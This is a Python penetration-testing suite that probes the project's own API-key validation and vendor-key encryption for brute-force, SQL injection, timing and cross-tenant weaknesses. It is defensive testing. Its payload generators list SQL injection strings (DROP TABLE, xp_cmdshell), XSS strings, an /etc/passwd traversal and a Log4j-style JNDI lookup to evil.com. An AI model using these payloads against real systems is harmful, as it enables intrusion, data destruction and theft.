"""
Penetration Testing Suite - Advanced security testing with attack simulations
Tests for real-world attack scenarios and advanced vulnerability discovery
"""

import asyncio
import base64
import hashlib
import json
import random
import secrets
import string
import time
from datetime import datetime, timedelta
from typing import Dict, List, Optional, Tuple
from uuid import UUID, uuid4
import concurrent.futures

import requests
from cryptography.fernet import Fernet
import jwt

# Import the services we're testing
from app.services.auth import validate_api_key, generate_api_key, hash_api_key
from app.services.encryption import encrypt_vendor_key, decrypt_vendor_key, get_vendor_key
from app.database import DatabaseUtils
from app.config import get_settings

settings = get_settings()


class PenetrationTestResults:
    """Container for penetration test results"""
    def __init__(self):
        self.attack_attempts = {}
        self.successful_attacks = []
        self.blocked_attacks = []
        self.performance_impact = {}
        
    def record_attack(self, attack_name: str, success: bool, details: str, 
                     response_time: float = 0.0, severity: str = "medium"):
        self.attack_attempts[attack_name] = {
            "success": success,
            "details": details,
            "response_time": response_time,
            "severity": severity,
            "timestamp": datetime.now().isoformat()
        }
        
        if success:
            self.successful_attacks.append({
                "attack": attack_name,
                "severity": severity,
                "details": details
            })
        else:
            self.blocked_attacks.append(attack_name)
    
    def get_summary(self) -> Dict:
        total_attacks = len(self.attack_attempts)
        successful = len(self.successful_attacks)
        blocked = len(self.blocked_attacks)
        
        return {
            "total_attacks": total_attacks,
            "successful_attacks": successful,
            "blocked_attacks": blocked,
            "success_rate": (successful / total_attacks) * 100 if total_attacks > 0 else 0,
            "high_severity_breaches": len([a for a in self.successful_attacks if a["severity"] == "high"]),
            "critical_breaches": len([a for a in self.successful_attacks if a["severity"] == "critical"])
        }


class AttackGenerator:
    """Generate various attack payloads for testing"""
    
    @staticmethod
    def generate_sql_injection_payloads() -> List[str]:
        """Generate SQL injection payloads"""
        return [
            "'; DROP TABLE api_keys; --",
            "' OR '1'='1' --",
            "' UNION SELECT username, password FROM admin_users --",
            "'; INSERT INTO companies (name) VALUES ('hacked'); --",
            "' OR 1=1 --",
            "'; UPDATE companies SET name='compromised' WHERE 1=1; --",
            "' AND (SELECT COUNT(*) FROM information_schema.tables) > 0 --",
            "'; EXEC xp_cmdshell('whoami'); --",
            "' UNION SELECT schema_name FROM information_schema.schemata --",
            "'; SELECT pg_sleep(10); --",
            "' OR EXISTS(SELECT * FROM pg_user WHERE usename='postgres') --",
            "'; COPY companies TO '/tmp/hacked.csv'; --"
        ]
    
    @staticmethod
    def generate_xss_payloads() -> List[str]:
        """Generate XSS payloads"""
        return [
            "<script>alert('XSS')</script>",
            "javascript:alert('XSS')",
            "<img src=x onerror=alert('XSS')>",
            "<svg onload=alert('XSS')>",
            "';alert('XSS');//",
            "\"><script>alert('XSS')</script>",
            "<iframe src='javascript:alert(`XSS`)'>",
            "<body onload=alert('XSS')>",
            "<input onfocus=alert('XSS') autofocus>",
            "<select onfocus=alert('XSS') autofocus>"
        ]
    
    @staticmethod
    def generate_api_key_attacks() -> List[str]:
        """Generate API key attack payloads"""
        attacks = []
        
        # Invalid format attacks
        attacks.extend([
            "als_",  # Too short
            "fake_key_without_prefix",
            "als_" + "a" * 100,  # Too long
            "als_../../../etc/passwd",  # Path traversal
            "als_${jndi:ldap://evil.com/a}",  # Log4j style
            "als_<script>alert('xss')</script>",  # XSS in key
            "als_' OR '1'='1",  # SQL injection
        ])
        
        # Brute force style attacks
        for i in range(50):
            fake_key = "als_" + ''.join(random.choices(string.ascii_letters + string.digits, k=43))
            attacks.append(fake_key)
        
        return attacks
    
    @staticmethod
    def generate_timing_attack_payloads() -> List[str]:
        """Generate payloads for timing attacks"""
        return [
            "a" * 1000,  # Long input
            "a" * 10000,  # Very long input
            "\x00" * 1000,  # Null bytes
            "🔥" * 500,  # Unicode
            "\n" * 1000,  # Newlines
            "\r\n" * 1000,  # CRLF
            "\t" * 1000,  # Tabs
        ]


class BruteForceAttacker:
    """Simulate brute force attacks"""
    
    async def attack_api_keys(self, test_results: PenetrationTestResults, 
                            max_attempts: int = 1000) -> None:
        """Perform brute force attack on API key validation"""
        start_time = time.time()
        attempts = 0
        successful_validations = 0
        
        attack_generator = AttackGenerator()
        payloads = attack_generator.generate_api_key_attacks()
        
        # Extend with more brute force attempts
        for i in range(max_attempts - len(payloads)):
            fake_key = "als_" + secrets.token_urlsafe(32)
            payloads.append(fake_key)
        
        for payload in payloads[:max_attempts]:
            try:
                result = await validate_api_key(payload)
                attempts += 1
                
                if result is not None:
                    successful_validations += 1
                    test_results.record_attack(
                        f"brute_force_success_{attempts}",
                        True,
                        f"Brute force attempt succeeded with payload: {payload[:20]}...",
                        severity="critical"
                    )
                
                # Add small delay to simulate real attack
                await asyncio.sleep(0.001)
                
            except Exception as e:
                # Exceptions are good - means attack was blocked
                pass
        
        elapsed_time = time.time() - start_time
        
        test_results.record_attack(
            "brute_force_api_keys",
            successful_validations > 0,
            f"Brute force attack: {attempts} attempts, {successful_validations} successful in {elapsed_time:.2f}s",
            response_time=elapsed_time,
            severity="high" if successful_validations > 0 else "low"
        )
    
    async def attack_with_concurrent_requests(self, test_results: PenetrationTestResults,
                                            concurrent_requests: int = 100) -> None:
        """Simulate concurrent brute force attacks"""
        start_time = time.time()
        
        async def single_attack():
            fake_key = "als_" + secrets.token_urlsafe(32)
            try:
                result = await validate_api_key(fake_key)
                return result is not None
            except:
                return False
        
        # Launch concurrent attacks
        tasks = [single_attack() for _ in range(concurrent_requests)]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        successful_attacks = sum(1 for r in results if r is True)
        elapsed_time = time.time() - start_time
        
        test_results.record_attack(
            "concurrent_brute_force",
            successful_attacks > 0,
            f"Concurrent attack: {concurrent_requests} requests, {successful_attacks} successful in {elapsed_time:.2f}s",
            response_time=elapsed_time,
            severity="high" if successful_attacks > 0 else "medium"
        )


class SQLInjectionAttacker:
    """Advanced SQL injection attacks"""
    
    async def test_blind_sql_injection(self, test_results: PenetrationTestResults) -> None:
        """Test for blind SQL injection vulnerabilities"""
        # Time-based blind SQL injection
        time_payloads = [
            "als_test'; SELECT pg_sleep(5); --",
            "als_test' AND (SELECT pg_sleep(5)) --",
            "als_test'; WAITFOR DELAY '00:00:05'; --",
            "als_test' OR (SELECT SLEEP(5)) --"
        ]
        
        for payload in time_payloads:
            start_time = time.time()
            try:
                result = await validate_api_key(payload)
                elapsed_time = time.time() - start_time
                
                # If response takes longer than expected, might indicate injection
                if elapsed_time > 3.0:  # Should be much faster normally
                    test_results.record_attack(
                        f"blind_sql_injection_time",
                        True,
                        f"Possible time-based SQL injection - response took {elapsed_time:.2f}s for payload: {payload[:50]}...",
                        response_time=elapsed_time,
                        severity="high"
                    )
                else:
                    test_results.record_attack(
                        f"blind_sql_injection_time_{len(test_results.attack_attempts)}",
                        False,
                        f"Time-based SQL injection blocked - response: {elapsed_time:.2f}s",
                        response_time=elapsed_time,
                        severity="low"
                    )
            except Exception as e:
                elapsed_time = time.time() - start_time
                test_results.record_attack(
                    f"blind_sql_injection_exception_{len(test_results.attack_attempts)}",
                    False,
                    f"SQL injection blocked with exception: {str(e)[:100]}",
                    response_time=elapsed_time,
                    severity="low"
                )
    
    async def test_union_based_injection(self, test_results: PenetrationTestResults) -> None:
        """Test UNION-based SQL injection"""
        union_payloads = [
            "als_test' UNION SELECT schema_name FROM information_schema.schemata --",
            "als_test' UNION SELECT table_name FROM information_schema.tables --",
            "als_test' UNION SELECT column_name FROM information_schema.columns --",
            "als_test' UNION SELECT version() --",
            "als_test' UNION SELECT current_user --",
            "als_test' UNION SELECT database() --"
        ]
        
        for payload in union_payloads:
            try:
                result = await validate_api_key(payload)
                
                # Any result other than None might indicate successful injection
                if result is not None:
                    test_results.record_attack(
                        f"union_sql_injection",
                        True,
                        f"Possible UNION SQL injection success with payload: {payload[:50]}...",
                        severity="critical"
                    )
                else:
                    test_results.record_attack(
                        f"union_sql_injection_{len(test_results.attack_attempts)}",
                        False,
                        "UNION SQL injection blocked",
                        severity="low"
                    )
            except Exception as e:
                test_results.record_attack(
                    f"union_sql_injection_exception_{len(test_results.attack_attempts)}",
                    False,
                    f"UNION SQL injection blocked with exception: {str(e)[:100]}",
                    severity="low"
                )


class EncryptionAttacker:
    """Test encryption implementations for vulnerabilities"""
    
    async def test_encryption_oracle_attacks(self, test_results: PenetrationTestResults,
                                           company_id: str) -> None:
        """Test for encryption oracle vulnerabilities"""
        try:
            # Test with various payloads to see if we can extract information
            test_keys = [
                "sk-short",
                "sk-" + "A" * 100,  # Long key
                "sk-" + "\x00" * 50,  # Null bytes
                "sk-" + "🔥" * 25,  # Unicode
                "",  # Empty
                "sk-normal_test_key_1234567890abcdef",  # Normal key
            ]
            
            encryption_times = []
            patterns = set()
            
            for test_key in test_keys:
                start_time = time.time()
                try:
                    encrypted = await encrypt_vendor_key(company_id, test_key)
                    elapsed_time = time.time() - start_time
                    encryption_times.append(elapsed_time)
                    
                    # Look for patterns in encrypted output
                    if len(encrypted) > 10:
                        pattern = encrypted[:10]  # First 10 chars
                        patterns.add(pattern)
                    
                except Exception as e:
                    elapsed_time = time.time() - start_time
                    encryption_times.append(elapsed_time)
            
            # Analyze results
            avg_time = sum(encryption_times) / len(encryption_times)
            time_variance = max(encryption_times) - min(encryption_times)
            
            # Check for timing attacks
            if time_variance > 0.1:  # More than 100ms variance
                test_results.record_attack(
                    "encryption_timing_attack",
                    True,
                    f"Encryption timing variance detected: {time_variance:.3f}s - possible timing attack vector",
                    severity="medium"
                )
            else:
                test_results.record_attack(
                    "encryption_timing_attack",
                    False,
                    f"Encryption timing consistent: variance {time_variance:.3f}s",
                    severity="low"
                )
            
            # Check for pattern leakage
            if len(patterns) < len(test_keys) - 1:  # Some patterns repeat
                test_results.record_attack(
                    "encryption_pattern_leakage",
                    True,
                    f"Possible encryption pattern leakage - {len(patterns)} unique patterns from {len(test_keys)} inputs",
                    severity="medium"
                )
            else:
                test_results.record_attack(
                    "encryption_pattern_leakage",
                    False,
                    "No encryption pattern leakage detected",
                    severity="low"
                )
                
        except Exception as e:
            test_results.record_attack(
                "encryption_oracle_test",
                False,
                f"Encryption oracle test failed: {e}",
                severity="low"
            )
    
    async def test_key_recovery_attacks(self, test_results: PenetrationTestResults,
                                      company_ids: List[str]) -> None:
        """Test for key recovery vulnerabilities"""
        if len(company_ids) < 2:
            return
        
        try:
            # Store same plaintext with different company keys
            test_plaintext = "sk-test_key_for_recovery_attack_1234567890abcdef"
            
            encrypted_versions = []
            for company_id in company_ids[:2]:
                encrypted = await encrypt_vendor_key(company_id, test_plaintext)
                encrypted_versions.append(encrypted)
            
            # Check if encrypted versions are identical (would be a major flaw)
            if encrypted_versions[0] == encrypted_versions[1]:
                test_results.record_attack(
                    "key_recovery_identical_ciphertext",
                    True,
                    "CRITICAL: Same plaintext produces identical ciphertext across companies",
                    severity="critical"
                )
            else:
                test_results.record_attack(
                    "key_recovery_identical_ciphertext",
                    False,
                    "Different companies produce different ciphertext for same plaintext",
                    severity="low"
                )
            
            # Test cross-company decryption attempts
            try:
                # Try to decrypt company1's data with company2's key
                cross_decryption = await decrypt_vendor_key(company_ids[1], encrypted_versions[0])
                
                if cross_decryption == test_plaintext:
                    test_results.record_attack(
                        "cross_company_decryption",
                        True,
                        "CRITICAL: Cross-company decryption successful - encryption isolation broken",
                        severity="critical"
                    )
                else:
                    test_results.record_attack(
                        "cross_company_decryption",
                        False,
                        "Cross-company decryption produced wrong result (good)",
                        severity="low"
                    )
            except Exception:
                test_results.record_attack(
                    "cross_company_decryption",
                    False,
                    "Cross-company decryption failed with exception (good)",
                    severity="low"
                )
                
        except Exception as e:
            test_results.record_attack(
                "key_recovery_test",
                False,
                f"Key recovery test failed: {e}",
                severity="low"
            )


class DataExfiltrationAttacker:
    """Test for data exfiltration vulnerabilities"""
    
    async def test_information_disclosure(self, test_results: PenetrationTestResults) -> None:
        """Test for information disclosure vulnerabilities"""
        
        # Test error message disclosure
        error_inducing_payloads = [
            None,
            "",
            "a" * 10000,  # Very long input
            "\x00\x01\x02",  # Binary data
            {"key": "value"},  # Wrong type
            ["list", "data"],  # Wrong type
        ]
        
        for payload in error_inducing_payloads:
            try:
                if payload is None:
                    result = await validate_api_key(None)
                else:
                    result = await validate_api_key(str(payload))
                
                # If we get detailed error information, it might be info disclosure
                test_results.record_attack(
                    f"error_info_disclosure_{type(payload).__name__}",
                    False,
                    f"No information disclosed for payload type: {type(payload).__name__}",
                    severity="low"
                )
                
            except Exception as e:
                error_message = str(e)
                
                # Check if error contains sensitive information
                sensitive_keywords = [
                    "password", "secret", "key", "token", "database", "connection",
                    "schema", "table", "column", "file", "path", "/", "\\"
                ]
                
                contains_sensitive = any(keyword in error_message.lower() for keyword in sensitive_keywords)
                
                if contains_sensitive:
                    test_results.record_attack(
                        f"sensitive_error_disclosure",
                        True,
                        f"Error message contains sensitive information: {error_message[:200]}",
                        severity="medium"
                    )
                else:
                    test_results.record_attack(
                        f"safe_error_handling_{len(test_results.attack_attempts)}",
                        False,
                        "Error message does not disclose sensitive information",
                        severity="low"
                    )


async def run_penetration_tests() -> PenetrationTestResults:
    """Run comprehensive penetration testing suite"""
    test_results = PenetrationTestResults()
    
    print("🚨 Starting penetration testing suite...")
    
    # Create test companies for testing
    test_companies = []
    try:
        for i in range(2):
            company_id = str(uuid4())
            schema_name = f"pentest_company_{i}"
            
            # Create company record
            query = """
                INSERT INTO companies (id, name, schema_name, rate_limit_rps, monthly_quota)
                VALUES ($1, $2, $3, 100, 10000.0)
            """
            await DatabaseUtils.execute_query(
                query,
                {
                    'id': UUID(company_id),
                    'name': f"PenTest Company {i}",
                    'schema_name': schema_name,
                }
            )
            
            # Create company schema
            await DatabaseUtils.execute_query(
                f"CREATE SCHEMA IF NOT EXISTS {schema_name}",
                {}
            )
            
            # Create vendor_keys table in company schema
            await DatabaseUtils.execute_query(
                f"""
                CREATE TABLE IF NOT EXISTS {schema_name}.vendor_keys (
                    id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
                    vendor VARCHAR(50) NOT NULL UNIQUE,
                    encrypted_key TEXT NOT NULL,
                    is_active BOOLEAN DEFAULT true,
                    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                )
                """,
                {}
            )
            
            test_companies.append(company_id)
    
    except Exception as e:
        print(f"Error creating test companies: {e}")
    
    try:
        # Initialize attackers
        brute_forcer = BruteForceAttacker()
        sql_attacker = SQLInjectionAttacker()
        encryption_attacker = EncryptionAttacker()
        data_attacker = DataExfiltrationAttacker()
        
        # Run brute force attacks
        print("🔨 Running brute force attacks...")
        await brute_forcer.attack_api_keys(test_results, max_attempts=500)
        await brute_forcer.attack_with_concurrent_requests(test_results, concurrent_requests=50)
        
        # Run SQL injection attacks
        print("💉 Running SQL injection attacks...")
        await sql_attacker.test_blind_sql_injection(test_results)
        await sql_attacker.test_union_based_injection(test_results)
        
        # Run encryption attacks
        if test_companies:
            print("🔐 Running encryption attacks...")
            await encryption_attacker.test_encryption_oracle_attacks(test_results, test_companies[0])
            await encryption_attacker.test_key_recovery_attacks(test_results, test_companies)
        
        # Run data exfiltration attacks
        print("📤 Running data exfiltration attacks...")
        await data_attacker.test_information_disclosure(test_results)
        
    finally:
        # Cleanup test companies
        try:
            for company_id in test_companies:
                await DatabaseUtils.execute_query(
                    "DELETE FROM companies WHERE id = $1",
                    {'id': UUID(company_id)}
                )
                schema_name = f"pentest_company_{test_companies.index(company_id)}"
                await DatabaseUtils.execute_query(
                    f"DROP SCHEMA IF EXISTS {schema_name} CASCADE",
                    {}
                )
        except Exception as e:
            print(f"Error cleaning up test companies: {e}")
    
    return test_results


if __name__ == "__main__":
    async def main():
        print("🏴‍☠️ Starting advanced penetration testing...")
        results = await run_penetration_tests()
        
        print("\n" + "="*60)
        print("PENETRATION TEST RESULTS")
        print("="*60)
        
        summary = results.get_summary()
        print(f"Total Attack Attempts: {summary['total_attacks']}")
        print(f"Successful Attacks: {summary['successful_attacks']}")
        print(f"Blocked Attacks: {summary['blocked_attacks']}")
        print(f"Attack Success Rate: {summary['success_rate']:.1f}%")
        print(f"High Severity Breaches: {summary['high_severity_breaches']}")
        print(f"Critical Breaches: {summary['critical_breaches']}")
        
        if results.successful_attacks:
            print("\n🚨 SUCCESSFUL ATTACKS:")
            for attack in results.successful_attacks:
                print(f"  [{attack['severity'].upper()}] {attack['attack']}")
                print(f"    {attack['details']}")
        
        print(f"\n🛡️  BLOCKED ATTACKS: {len(results.blocked_attacks)}")
        
        print("\n📊 DETAILED ATTACK LOG:")
        for attack_name, details in results.attack_attempts.items():
            status = "💥 SUCCESS" if details['success'] else "🛡️  BLOCKED"
            severity = f"[{details['severity'].upper()}]"
            response_time = f"({details['response_time']:.3f}s)" if details['response_time'] > 0 else ""
            
            print(f"  {status} {attack_name} {severity} {response_time}")
            print(f"    {details['details']}")
        
        # Save results to file
        with open("penetration_test_results.json", "w") as f:
            json.dump({
                "summary": summary,
                "successful_attacks": results.successful_attacks,
                "attack_attempts": results.attack_attempts,
                "timestamp": datetime.now().isoformat()
            }, f, indent=2)
        
        print(f"\n📄 Full results saved to: penetration_test_results.json")
        
        if summary['critical_breaches'] > 0:
            print("\n🚨 CRITICAL: System has critical security vulnerabilities!")
            return 2
        elif summary['successful_attacks'] > summary['total_attacks'] * 0.1:  # More than 10% success
            print("\n⚠️  WARNING: High attack success rate - security improvements needed!")
            return 1
        else:
            print("\n✅ Penetration testing completed - system shows good resistance to attacks!")
            return 0
    
    exit(asyncio.run(main()))